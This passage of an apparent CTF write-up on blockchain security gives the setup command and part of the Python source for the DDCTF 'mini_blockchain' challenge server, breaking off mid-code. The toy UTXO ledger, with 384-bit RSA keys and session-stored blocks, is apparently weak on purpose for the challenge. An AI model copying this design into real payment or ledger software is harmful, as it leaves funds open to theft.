{"title":"Preliminary Exploration of Public Chain Security","uid":"ab8ce4952a43550ec79920bab8adbb0a","slug":"mini_blockchian","date":"2022-12-01T11:52:01.667Z","updated":"2022-12-05T18:16:44.377Z","comments":true,"path":"api/articles/mini_blockchian.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20221206021623489.png","content":"<h1 id=\"0x01-challenge\"><a href=\"#0x01-challenge\" class=\"headerlink\" title=\"0x01 challenge\"></a>0x01 challenge</h1><img src=\"https://cdn.jsdelivr.net/gh/bcYng-image/image/img/image-20221130161941455.png\" style=\"zoom:50%;\" />\n\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">docker run -it -p 5000:5000 chainflag&#x2F;mini_blockchain\n&#x2F;&#x2F;运行题目<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h1 id=\"0x02-source-code\"><a href=\"#0x02-source-code\" class=\"headerlink\" title=\"0x02 source code\"></a>0x02 source code</h1><h3 id=\"Serve-py\"><a href=\"#Serve-py\" class=\"headerlink\" title=\"Serve.py\"></a>Serve.py</h3><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token comment\"># written in python 2.7</span>\n__author__ <span class=\"token operator\">=</span> <span class=\"token string\">'garzon'</span>\n\n<span class=\"token keyword\">import</span> hashlib<span class=\"token punctuation\">,</span> json<span class=\"token punctuation\">,</span> rsa<span class=\"token punctuation\">,</span> uuid<span class=\"token punctuation\">,</span> os\n<span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask<span class=\"token punctuation\">,</span> session<span class=\"token punctuation\">,</span> redirect<span class=\"token punctuation\">,</span> url_for<span class=\"token punctuation\">,</span> escape<span class=\"token punctuation\">,</span> request\n\napp <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span>\napp<span class=\"token punctuation\">.</span>secret_key <span class=\"token operator\">=</span> <span class=\"token string\">'*********************'</span>\nurl_prefix <span class=\"token operator\">=</span> <span class=\"token string\">'/b9ca5f959dd7e'</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">FLAG</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string\">'Here is your flag: DDCTF&#123;******************&#125;'</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">hash</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> hashlib<span class=\"token punctuation\">.</span>sha256<span class=\"token punctuation\">(</span>hashlib<span class=\"token punctuation\">.</span>md5<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>hexdigest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">hash_reducer</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">hash</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hash</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">hash</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">has_attrs</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> attrs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">\"Input should be a dict/JSON\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> attr <span class=\"token keyword\">in</span> attrs<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> attr <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> d<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125; should be presented in the input\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>attr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\nEMPTY_HASH <span class=\"token operator\">=</span> <span class=\"token string\">'0'</span><span class=\"token operator\">*</span><span class=\"token number\">64</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">addr_to_pubkey</span><span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> rsa<span class=\"token punctuation\">.</span>PublicKey<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">65537</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">pubkey_to_address</span><span class=\"token punctuation\">(</span>pubkey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">assert</span> pubkey<span class=\"token punctuation\">.</span>e <span class=\"token operator\">==</span> <span class=\"token number\">65537</span>\n    hexed <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>pubkey<span class=\"token punctuation\">.</span>n<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> hexed<span class=\"token punctuation\">.</span>endswith<span class=\"token punctuation\">(</span><span class=\"token string\">'L'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> hexed <span class=\"token operator\">=</span> hexed<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">if</span> hexed<span class=\"token punctuation\">.</span>startswith<span class=\"token punctuation\">(</span><span class=\"token string\">'0x'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> hexed <span class=\"token operator\">=</span> hexed<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">return</span> hexed\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">gen_addr_key_pair</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    pubkey<span class=\"token punctuation\">,</span> privkey <span class=\"token operator\">=</span> rsa<span class=\"token punctuation\">.</span>newkeys<span class=\"token punctuation\">(</span><span class=\"token number\">384</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> pubkey_to_address<span class=\"token punctuation\">(</span>pubkey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> privkey\n\nbank_address<span class=\"token punctuation\">,</span> bank_privkey <span class=\"token operator\">=</span> gen_addr_key_pair<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nhacker_address<span class=\"token punctuation\">,</span> hacker_privkey <span class=\"token operator\">=</span> gen_addr_key_pair<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nshop_address<span class=\"token punctuation\">,</span> shop_privkey <span class=\"token operator\">=</span> gen_addr_key_pair<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nshop_wallet_address<span class=\"token punctuation\">,</span> shop_wallet_privkey <span class=\"token operator\">=</span> gen_addr_key_pair<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">sign_input_utxo</span><span class=\"token punctuation\">(</span>input_utxo_id<span class=\"token punctuation\">,</span> privkey<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> rsa<span class=\"token punctuation\">.</span>sign<span class=\"token punctuation\">(</span>input_utxo_id<span class=\"token punctuation\">,</span> privkey<span class=\"token punctuation\">,</span> <span class=\"token string\">'SHA-1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'hex'</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">hash_utxo</span><span class=\"token punctuation\">(</span>utxo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">reduce</span><span class=\"token punctuation\">(</span>hash_reducer<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'amount'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">create_output_utxo</span><span class=\"token punctuation\">(</span>addr_to<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    utxo <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">:</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>uuid<span class=\"token punctuation\">.</span>uuid4<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'addr'</span><span class=\"token punctuation\">:</span> addr_to<span class=\"token punctuation\">,</span> <span class=\"token string\">'amount'</span><span class=\"token punctuation\">:</span> amount<span class=\"token punctuation\">&#125;</span>\n    utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> hash_utxo<span class=\"token punctuation\">(</span>utxo<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> utxo\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">hash_tx</span><span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">reduce</span><span class=\"token punctuation\">(</span>hash_reducer<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token builtin\">reduce</span><span class=\"token punctuation\">(</span>hash_reducer<span class=\"token punctuation\">,</span> tx<span class=\"token punctuation\">[</span><span class=\"token string\">'input'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> EMPTY_HASH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">reduce</span><span class=\"token punctuation\">(</span>hash_reducer<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> utxo <span class=\"token keyword\">in</span> tx<span class=\"token punctuation\">[</span><span class=\"token string\">'output'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> EMPTY_HASH<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">create_tx</span><span class=\"token punctuation\">(</span>input_utxo_ids<span class=\"token punctuation\">,</span> output_utxo<span class=\"token punctuation\">,</span> privkey_from<span class=\"token operator\">=</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    tx <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'input'</span><span class=\"token punctuation\">:</span> input_utxo_ids<span class=\"token punctuation\">,</span> <span class=\"token string\">'signature'</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>sign_input_utxo<span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span> privkey_from<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">id</span> <span class=\"token keyword\">in</span> input_utxo_ids<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'output'</span><span class=\"token punctuation\">:</span> output_utxo<span class=\"token punctuation\">&#125;</span>\n    tx<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> hash_tx<span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> tx\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">hash_block</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">reduce</span><span class=\"token punctuation\">(</span>hash_reducer<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>block<span class=\"token punctuation\">[</span><span class=\"token string\">'prev'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> block<span class=\"token punctuation\">[</span><span class=\"token string\">'nonce'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">reduce</span><span class=\"token punctuation\">(</span>hash_reducer<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span>tx<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> tx <span class=\"token keyword\">in</span> block<span class=\"token punctuation\">[</span><span class=\"token string\">'transactions'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> EMPTY_HASH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">create_block</span><span class=\"token punctuation\">(</span>prev_block_hash<span class=\"token punctuation\">,</span> nonce_str<span class=\"token punctuation\">,</span> transactions<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>prev_block_hash<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'prev_block_hash should be hex-encoded hash value'</span><span class=\"token punctuation\">)</span>\n    nonce <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>nonce_str<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>nonce<span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">128</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'the nonce is too long'</span><span class=\"token punctuation\">)</span>\n    block <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token string\">'prev'</span><span class=\"token punctuation\">:</span> prev_block_hash<span class=\"token punctuation\">,</span> <span class=\"token string\">'nonce'</span><span class=\"token punctuation\">:</span> nonce<span class=\"token punctuation\">,</span> <span class=\"token string\">'transactions'</span><span class=\"token punctuation\">:</span> transactions<span class=\"token punctuation\">&#125;</span>\n    block<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> hash_block<span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> block\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">find_blockchain_tail</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">max</span><span class=\"token punctuation\">(</span>session<span class=\"token punctuation\">[</span><span class=\"token string\">'blocks'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>values<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> key<span class=\"token operator\">=</span><span class=\"token keyword\">lambda</span> block<span class=\"token punctuation\">:</span> block<span class=\"token punctuation\">[</span><span class=\"token string\">'height'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    \n<span class=\"token keyword\">def</span> <span class=\"token function\">calculate_utxo</span><span class=\"token punctuation\">(</span>blockchain_tail<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    curr_block <span class=\"token operator\">=</span> blockchain_tail\n    blockchain <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>curr_block<span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">while</span> curr_block<span class=\"token punctuation\">[</span><span class=\"token string\">'hash'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> session<span class=\"token punctuation\">[</span><span class=\"token string\">'genesis_block_hash'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>\n        curr_block <span class=\"token operator\">=</span> session<span class=\"token punctuation\">[</span><span class=\"token string\">'blocks'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>curr_block<span class=\"token punctuation\">[</span><span class=\"token string\">'prev'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span>\n        blockchain<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>curr_block<span class=\"token punctuation\">)</span>\n    blockchain <span class=\"token operator\">=</span> blockchain<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n    utxos <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">for</span> block <span class=\"token keyword\">in</span> blockchain<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> tx <span class=\"token keyword\">in</span> block<span class=\"token punctuation\">[</span><span class=\"token string\">'transactions'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">for</span> input_utxo_id <span class=\"token keyword\">in</span> tx<span class=\"token punctuation\">[</span><span class=\"token string\">'input'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>\n                <span class=\"token keyword\">del</span> utxos<span class=\"token punctuation\">[</span>input_utxo_id<span class=\"token punctuation\">]</span>\n            <span class=\"token keyword\">for</span> utxo <span class=\"token keyword\">in</span> tx<span class=\"token punctuation\">[</span><span class=\"token string\">'output'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>\n                utxos<span class=\"token punctuation\">[</span>utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> utxo\n    <span class=\"token keyword\">return</span> utxos\n        \n<span class=\"token keyword\">def</span> <span class=\"token function\">calculate_balance</span><span class=\"token punctuation\">(</span>utxos<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    balance <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>bank_address<span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> hacker_address<span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> shop_address<span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">for</span> utxo <span class=\"token keyword\">in</span> utxos<span class=\"token punctuation\">.</span>values<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">if</span> utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'addr'</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> balance<span class=\"token punctuation\">:</span>\n            balance<span class=\"token punctuation\">[</span>utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n        balance<span class=\"token punctuation\">[</span>utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'amount'</span><span class=\"token punctuation\">]</span>\n    <span class=\"token keyword\">return</span> balance\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">verify_utxo_signature</span><span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">,</span> utxo_id<span class=\"token punctuation\">,</span> signature<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> rsa<span class=\"token punctuation\">.</span>verify<span class=\"token punctuation\">(</span>utxo_id<span class=\"token punctuation\">,</span> signature<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'hex'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> addr_to_pubkey<span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">append_block</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">,</span> difficulty<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token string\">'f'</span><span class=\"token operator\">*</span><span class=\"token number\">64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    has_attrs<span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'prev'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'nonce'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'transactions'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">[</span><span class=\"token string\">'prev'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span><span class=\"token string\">u''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> block<span class=\"token punctuation\">[</span><span class=\"token string\">'prev'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">[</span><span class=\"token string\">'prev'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">[</span><span class=\"token string\">'nonce'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span><span class=\"token string\">u''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> block<span class=\"token punctuation\">[</span><span class=\"token string\">'nonce'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">[</span><span class=\"token string\">'nonce'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> block<span class=\"token punctuation\">[</span><span class=\"token string\">'prev'</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> session<span class=\"token punctuation\">[</span><span class=\"token string\">'blocks'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">\"unknown parent block\"</span><span class=\"token punctuation\">)</span>\n    tail <span class=\"token operator\">=</span> session<span class=\"token punctuation\">[</span><span class=\"token string\">'blocks'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>block<span class=\"token punctuation\">[</span><span class=\"token string\">'prev'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span>\n    utxos <span class=\"token operator\">=</span> calculate_utxo<span class=\"token punctuation\">(</span>tail<span class=\"token punctuation\">)</span>\n    \n    <span class=\"token keyword\">if</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">[</span><span class=\"token string\">'transactions'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'Please put a transaction array in the block'</span><span class=\"token punctuation\">)</span>\n    new_utxo_ids <span class=\"token operator\">=</span> <span class=\"token builtin\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> tx <span class=\"token keyword\">in</span> block<span class=\"token punctuation\">[</span><span class=\"token string\">'transactions'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>\n        has_attrs<span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'input'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'output'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'signature'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n        \n        <span class=\"token keyword\">for</span> utxo <span class=\"token keyword\">in</span> tx<span class=\"token punctuation\">[</span><span class=\"token string\">'output'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span>\n            has_attrs<span class=\"token punctuation\">(</span>utxo<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'amount'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'addr'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span><span class=\"token string\">u''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span><span class=\"token string\">u''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'addr'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'addr'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>utxo<span class=\"token punctuation\">[</span><span class=\"token string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">\"unknown type of id of output 